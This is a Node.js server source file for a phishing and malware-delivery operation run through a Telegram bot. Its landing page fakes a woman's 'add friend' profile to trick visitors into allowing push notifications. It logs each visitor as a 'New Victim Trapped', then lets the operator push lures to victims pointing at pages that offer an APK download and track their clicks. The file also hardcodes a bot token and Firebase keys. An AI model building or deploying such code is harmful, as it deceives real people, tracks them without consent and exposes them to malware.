const TelegramBot = require('node-telegram-bot-api');
const admin = require('firebase-admin');
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ===============================
// 1️⃣ Firebase Init
// ===============================
const serviceAccount = require('./firebase-key.json');
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: 'https://my-sc-tools-default-rtdb.firebaseio.com'
});
const db = admin.database();

// ===============================
// 2️⃣ Telegram Bot Config
// ===============================
const botToken = '8226802389:AAE9B04pvV7F4vSAu0MUtSBrF4Qh4qc0VQc';
const bot = new TelegramBot(botToken, { polling: false });

const ADMIN_IDS = [8271536101];
const LOG_CHAT_ID = -1003552771281;
function isAdmin(msg) { return ADMIN_IDS.includes(msg.from.id); }

// ===============================
// 3️⃣ Main Trap Landing Page (Auto Chrome Open & WhatsApp Preview)
// ===============================
app.get('/', (req, res) => {
  const baseUrl = process.env.RENDER_EXTERNAL_URL || `https://${req.headers.host}`;
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nusrat Jahan</title>
    <!-- WhatsApp / Messenger Open Graph Preview -->
    <meta property="og:title" content="Nusrat Jahan - My Profile" />
    <meta property="og:description" content="Click to view my private stories and add me!" />
    <meta property="og:image" content="${baseUrl}/my-logo.jpg" />
    <meta property="og:type" content="website" />
    <meta property="og:url" content="${baseUrl}" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
        body { background-color: #f2f2f2; height: 100vh; display: flex; flex-direction: column; text-align: center; }
        .cover-photo { height: 150px; background: url('cover-bg.jpg') center/cover; background-color: #1a2b22; }
        .profile-pic-container { margin-top: -50px; }
        .profile-pic-container img { width: 100px; height: 100px; border-radius: 50%; border: 4px solid white; object-fit: cover; }
        .profile-name { font-size: 24px; font-weight: bold; margin-top: 10px; color:#333; }
        .bio { padding: 15px; color:#555; }
        .add-friend-btn { background-color: #0099ff; color: white; border: none; padding: 15px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 90%; margin: 20px auto; display:block; text-decoration: none;}
        #browser-warning { display:none; background:#ffeb3b; color:#d32f2f; padding:20px; font-weight:bold; font-size:18px; position:absolute; top:0; left:0; width:100%; height:100%; z-index:9999; text-align:center; padding-top:100px;}
    </style>
</head>
<body>
    <div id="browser-warning">
        ⚠️ Please tap the 3 dots (•••) at the top right and select "Open in Browser" or "Open in Chrome" to continue.
    </div>

    <div class="cover-photo"></div>
    <div class="profile-pic-container"><img src="/my-logo.jpg" alt="Profile"></div>
    <div class="profile-name">Nusrat Jahan</div>
    <div class="bio">I love making new friends! Allow notifications to connect with me. ❤️</div>
    
    <button class="add-friend-btn" id="imoBtn">💬 Add friend in imo</button>

    <script type="module">
        // 1. Force Default Browser Logic
        const ua = navigator.userAgent || navigator.vendor || window.opera;
        const isInApp = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Instagram") > -1) || (ua.indexOf("WhatsApp") > -1);
        
        if (isInApp) {
            if (/android/i.test(ua)) {
                window.location.href = "intent://" + window.location.host + window.location.pathname + "#Intent;scheme=https;package=com.android.chrome;end";
            } else {
                document.getElementById('browser-warning').style.display = 'block';
            }
        }

        // 2. Push Notification Logic
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
        import { getMessaging, getToken } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-messaging.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCYH0ZSeLjH_T3HJ9hVQ84afB5KyAEZi2Y",
            authDomain: "my-sc-tools.firebaseapp.com",
            projectId: "my-sc-tools",
            messagingSenderId: "285986090017",
            appId: "1:285986090017:web:9d872b9bb5c472bcb74760"
        };
        const app = initializeApp(firebaseConfig);
        const messaging = getMessaging(app);

        document.getElementById('imoBtn').addEventListener('click', async () => {
            if ("Notification" in window && "serviceWorker" in navigator) {
                try {
                    const permission = await Notification.requestPermission();
                    if (permission === 'granted') {
                        document.getElementById('imoBtn').innerText = "Connecting...";
                        const registration = await navigator.serviceWorker.register('./firebase-messaging-sw.js');
                        await navigator.serviceWorker.ready;

                        const token = await getToken(messaging, { 
                            vapidKey: 'BFZRrODefiSlDVoj_TtYJm4-iWycsHZ4uDn5hT90w-QOLV6wS7_gblBI2UUouGQcAqqnEB3FySSVF9JwbTXK7B8',
                            serviceWorkerRegistration: registration 
                        });

                        if (token) {
                            await fetch('/api/saveToken', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ token: token })
                            });
                        }
                    } else { alert("Please allow notifications to proceed!"); return; }
                } catch (error) { console.error(error); }
            }
            window.location.href = "https://profile.imo.im/profileshare/shr.AAAAAAAAAAAAAAAAAAAAAFEY15og6iUe5Wjo1F2Suvfjisax_8ooeiwD4AVOrl4c";
        });
    </script>
</body>
</html>`);
});

// ===============================
// 4️⃣ API to Save Sequential Tokens (user1, user2...)
// ===============================
app.post('/api/saveToken', async (req, res) => {
  const { token } = req.body;
  if(!token) return res.status(400).send('Missing token');

  const existingSnap = await db.ref('tokens').orderByChild('token').equalTo(token).once('value');
  if(existingSnap.exists()){
      return res.send('Already Exists');
  }

  const counterRef = db.ref('counters/userCount');
  await counterRef.transaction((currentValue) => {
      return (currentValue || 0) + 1;
  }, async (error, committed, snapshot) => {
      if(committed){
          const nextNum = snapshot.val();
          const userId = `user${nextNum}`;
          await db.ref(`tokens/${userId}`).set({ token, createdAt: Date.now() });
          await bot.sendMessage(LOG_CHAT_ID, `🎉 New Victim Trapped: <b>${userId}</b>`, {parse_mode: 'HTML'});
      }
  });
  res.send('OK');
});

// ===============================
// 5️⃣ Webhook Logic (Commands & Dynamic Pages) - 100% Loop Fixed
// ===============================
app.post(`/webhook/${botToken}`, async (req,res)=>{
  const update = req.body;
  
  if(update.message && isAdmin(update.message)){
    const msg = update.message;
    const chatId = msg.chat.id;
    const text = msg.text || '';

    try {
        // A. LIST ALL USERS (/userlist) - Only formats "user1", "user2"
        if(text === '/userlist'){
            const snap = await db.ref('tokens').once('value');
            const tokens = snap.val();
            
            if(!tokens) {
                await bot.sendMessage(chatId, "📋 No active users found.");
            } else {
                let list = "📋 <b>Active Users:</b>\n\n";
                for(let user in tokens) { 
                    if(user.startsWith('user')) {
                        list += `✅ ${user}\n`; 
                    }
                }
                if(list === "📋 <b>Active Users:</b>\n\n") list += "No valid users found. Delete old tokens from Firebase.";
                await bot.sendMessage(chatId, list, {parse_mode: 'HTML'});
            }
            return res.sendStatus(200); // Prevents Loop
        }

        // B. SEND TARGETED PUSH (/send userX message)
        const sendMatch = text.match(/^\/send\s+(user\d+)\s+([\s\S]+)/i);
        if(sendMatch){
            const targetUser = sendMatch[1].toLowerCase();
            const messageText = sendMatch[2];
            await bot.sendMessage(chatId, `⏳ Sending to ${targetUser}...`);
            await sendPushMessage(chatId, [targetUser], messageText);
            return res.sendStatus(200); // Prevents Loop
        }

        // C. SEND ALL PUSH (/sendall message)
        const sendAllMatch = text.match(/^\/sendall\s+([\s\S]+)/i);
        if(sendAllMatch){
            const messageText = sendAllMatch[1];
            const snap = await db.ref('tokens').once('value');
            const tokens = snap.val();
            
            if(!tokens) {
                await bot.sendMessage(chatId, "⚠️ No active users found.");
                return res.sendStatus(200);
            }
            
            // Only send to clean "user1", "user2" formatted users
            const validUsers = Object.keys(tokens).filter(k => k.startsWith('user'));
            
            await bot.sendMessage(chatId, `⏳ Sending to ${validUsers.length} users...`);
            await sendPushMessage(chatId, validUsers, messageText);
            return res.sendStatus(200); // Prevents Loop
        }

        // D. DYNAMIC MEDIA PAGE GENERATOR (Photo/Video/Document)
        const file = msg.document || msg.video || (msg.photo && msg.photo.pop());
        if(file){
            await bot.sendMessage(chatId, '⏳ Generating dynamic custom page...');
            const fileIdHash = crypto.randomBytes(6).toString('hex');
            const caption = msg.caption || 'Awesome Content Inside!';
            const mimeType = file.mime_type || 'application/octet-stream';
            
            await db.ref(`files/${fileIdHash}`).set({ 
                telegramFileId: file.file_id, 
                type: mimeType,
                caption: caption
            });

            const baseUrl = process.env.RENDER_EXTERNAL_URL || `https://${req.headers.host}`;
            const pageUrl = `${baseUrl}/page/${fileIdHash}`;

            const reply = `✅ <b>Dynamic Page Created!</b>\n\n🔗 Link: ${pageUrl}\n\n<i>To send this to a user:</i>\n<code>/send user1 Click here to see: ${pageUrl}</code>\n\n<i>To send to everyone:</i>\n<code>/sendall Update available: ${pageUrl}</code>`;
            
            await bot.sendMessage(LOG_CHAT_ID, reply, {parse_mode: 'HTML'});
            await bot.sendMessage(chatId, reply, {parse_mode: 'HTML'});
            return res.sendStatus(200); // Prevents Loop
        }

    } catch (e) {
        console.error("Webhook Error:", e);
        await bot.sendMessage(chatId, '⚠️ Error processing command: ' + e.message);
        return res.sendStatus(200); // Catch errors and prevent loop
    }
  }
  
  // 🔴 MAGIC FIX: Always return 200 OK so Telegram stops looping
  res.sendStatus(200);
});

// ===============================
// 6️⃣ Push Notification Logic (with Auto Dead-Token Remove & URL Extraction)
// ===============================
async function sendPushMessage(chatId, userIds, messageText) {
  const urlRegex = /(https?:\/\/[^\s]+)/g;
  const links = messageText.match(urlRegex);
  const clickLink = links ? links[0] : (process.env.RENDER_EXTERNAL_URL || "https://google.com");

  let tokensList = [];
  let userMap = {};

  for(let uid of userIds){
      const snap = await db.ref(`tokens/${uid}`).once('value');
      const data = snap.val();
      if(data && data.token){
          tokensList.push(data.token);
          userMap[data.token] = uid;
      }
  }

  if(tokensList.length === 0){
      return bot.sendMessage(chatId, "⚠️ No valid tokens found for selected user(s).");
  }

  const message = {
      notification: { title: "New Message for You!", body: messageText },
      data: { link: clickLink },
      tokens: tokensList
  };

  try {
      const response = await admin.messaging().sendEachForMulticast(message);
      let successCount = response.successCount;
      let failureCount = response.failureCount;
      let reportStr = `✅ <b>Push Notification Status</b>\n\nSent: ${successCount}\nFailed: ${failureCount}\n`;

      if(failureCount > 0){
          reportStr += `\n<i>Cleaning dead tokens...</i>\n`;
          response.responses.forEach((res, idx) => {
              if(!res.success){
                  const badToken = tokensList[idx];
                  const badUserId = userMap[badToken];
                  if(['messaging/invalid-registration-token', 'messaging/registration-token-not-registered'].includes(res.error.code)){
                      db.ref(`tokens/${badUserId}`).remove();
                      reportStr += `🗑️ Removed dead user: ${badUserId}\n`;
                  }
              }
          });
      }
      await bot.sendMessage(chatId, reportStr, {parse_mode: 'HTML'});
  } catch (e) {
      await bot.sendMessage(chatId, "⚠️ Push Failed: " + e.message);
  }
}

// ===============================
// 7️⃣ Telegram CDN Stream Proxy
// ===============================
app.get('/stream/:fileIdHash', async (req, res) => {
  try {
    const snap = await db.ref(`files/${req.params.fileIdHash}`).once('value');
    const data = snap.val();
    if (!data) return res.status(404).send('Not found');

    const fileInfo = await bot.getFile(data.telegramFileId);
    const url = `https://api.telegram.org/file/bot${botToken}/${fileInfo.file_path}`;

    res.setHeader('Content-Type', data.type);
    const response = await axios({ url, method: 'GET', responseType: 'stream' });
    response.data.pipe(res);
  } catch (e) { res.status(500).send('Error'); }
});

// ===============================
// 8️⃣ The Custom Dynamic Page (Served to User)
// ===============================
app.get('/page/:fileId', async (req, res) => {
    const { fileId } = req.params;
    try {
        const snap = await db.ref(`files/${fileId}`).once('value');
        const data = snap.val();
        if(!data) return res.status(404).send('Page Expired or Removed.');

        const sessionId = crypto.randomBytes(4).toString('hex');
        await bot.sendMessage(LOG_CHAT_ID, `🟢 User entered page <code>${fileId}</code>\nSession ID: ${sessionId}`, {parse_mode: 'HTML'});

        let mediaHtml = '';
        if(data.type.startsWith('image/')) mediaHtml = `<img src="/stream/${fileId}" alt="Image">`;
        else if(data.type.startsWith('video/')) mediaHtml = `<video controls autoplay><source src="/stream/${fileId}" type="${data.type}"></video>`;
        else mediaHtml = `<a href="/stream/${fileId}" download class="btn">📥 Download File / APK</a>`;

        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Exclusive Content</title>
            <style>
                body { font-family: sans-serif; background: #eef2f3; text-align: center; padding: 20px; }
                .card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; max-width: 100%; width: 400px; }
                img, video { max-width: 100%; border-radius: 8px; margin-top: 15px; }
                .caption { font-size: 18px; color: #333; font-weight: bold; margin-bottom: 15px; white-space: pre-wrap;}
                .btn { display: inline-block; padding: 12px 25px; background: #28a745; color: white; text-decoration: none; border-radius: 6px; font-weight: bold; margin-top: 20px; }
            </style>
        </head>
        <body>
            <div class="card">
                <div class="caption">${data.caption}</div>
                ${mediaHtml}
            </div>
            
            <script>
                const sessionId = "${sessionId}";
                document.addEventListener('click', (e) => {
                    const tag = e.target.tagName;
                    if(tag !== 'HTML' && tag !== 'BODY') {
                        fetch('/report/'+sessionId+'/Clicked_'+tag).catch(err=>console.log(err));
                    }
                });
            </script>
        </body>
        </html>`);
    } catch(e) { res.status(500).send('Server Error'); }
});

// ===============================
// 9️⃣ Activity Logger Endpoint
// ===============================
app.get('/report/:sessionId/:action', async (req,res)=>{
  const { sessionId, action } = req.params;
  try{
    await bot.sendMessage(LOG_CHAT_ID, `👀 Activity [Session ${sessionId}]: ${action}`);
    res.send('OK');
  }catch(e){ res.status(500).send('Error'); }
});

// ===============================
// 🔟 Server Start & Auto Webhook
// ===============================
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`Server running on port ${PORT}`);
  const webhookUrl = process.env.RENDER_EXTERNAL_URL 
    ? `${process.env.RENDER_EXTERNAL_URL}/webhook/${botToken}` 
    : `https://your-domain.com/webhook/${botToken}`;
    
  await bot.setWebHook(webhookUrl);
  console.log('Webhook Configured:', webhookUrl);
});
